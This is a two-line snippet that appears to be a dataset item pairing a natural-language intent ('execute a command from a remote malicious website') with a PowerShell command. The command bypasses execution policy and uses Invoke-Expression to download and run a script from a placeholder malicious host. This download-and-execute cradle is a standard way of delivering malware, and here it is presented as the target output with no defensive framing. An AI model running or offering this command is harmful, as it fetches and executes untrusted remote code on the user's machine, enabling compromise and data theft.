# Natural language intent:
# Execute a command from a remote malicious website using PowerShell

powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://very-bad-website.com/')}"
